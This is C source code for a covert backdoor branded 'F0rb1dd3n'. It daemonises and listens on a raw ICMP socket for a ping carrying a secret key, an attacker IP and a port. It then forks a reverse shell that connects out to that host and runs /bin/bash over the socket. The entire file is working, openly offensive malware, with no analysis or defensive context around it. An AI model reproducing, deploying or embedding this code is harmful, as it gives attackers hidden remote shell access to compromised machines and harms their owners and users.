#include <stdio.h>
#include <sys/types.h> 
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <netdb.h>
#include <unistd.h>
#include <ctype.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <signal.h>

#define KEY		"F0rb1dd3n"
#define PACKET_SIZE 	1024
#define MOTD 		"\n\t\e[00;31mWellcome to F0rb1dd3n's sensual reverse shell!\n\n"

void reverse_shell(char *host, int port){
        int sockfd;
        struct hostent *host_info;
        struct sockaddr_in target_addr;
        char *arg[] = {"/bin/bash", NULL};

        if((host_info = gethostbyname(host)) == NULL)
                exit(-1);

        target_addr.sin_family = AF_INET;
        target_addr.sin_port = htons(port);
        target_addr.sin_addr = *((struct in_addr *)host_info->h_addr);
        memset(&(target_addr.sin_zero), '\0', 8); 

        if ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)
                exit(-1);

        if (connect(sockfd, (struct sockaddr *)&target_addr, sizeof(struct sockaddr)) == -1)
                exit(-1);

        send(sockfd, MOTD, strlen(MOTD), 0);
        dup2(sockfd, 0);
        dup2(sockfd, 1);
        dup2(sockfd, 2);
        execve("/bin/bash", arg, NULL);
	close(sockfd);
}

void ping_listener(void){
	int sockfd, n, icmp_ksize;
	char buf[PACKET_SIZE + 1];
    	struct ip *ip;
	struct icmp *icmp;

	icmp_ksize = strlen(KEY);
    	
	if((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) == -1)
		exit(-1);
	
	while(1){
        	bzero(buf, PACKET_SIZE + 1);        
        	n = recv(sockfd, buf, PACKET_SIZE, 0);
		if(n > 0){    
            		ip = (struct ip *)buf;
            		icmp = (struct icmp *)(ip + 1);
            
            		if((icmp->icmp_type == ICMP_ECHO) && (memcmp(icmp->icmp_data, KEY, icmp_ksize) == 0)){
                		char attacker_ip[16];
                		int attacker_port;
                
                		attacker_port = 0;
                		bzero(attacker_ip, sizeof(attacker_ip));
                		sscanf((char *)(icmp->icmp_data + icmp_ksize + 1), "%15s %d", attacker_ip, &attacker_port);
                
                		if((attacker_port <= 0) || (strlen(attacker_ip) < 7)){
					continue;
				} else {
                			if(fork() == 0){
						reverse_shell(attacker_ip, attacker_port);
                    				exit(EXIT_SUCCESS);
                			}
				}
            		}		
        	}
	}
}

int main(int argc, char *argv[]){ 
   	signal(SIGCLD, SIG_IGN); 
    	chdir("/");
	
	if(fork() != 0) exit(-1);
	
	ping_listener();
	
	return EXIT_SUCCESS;
}
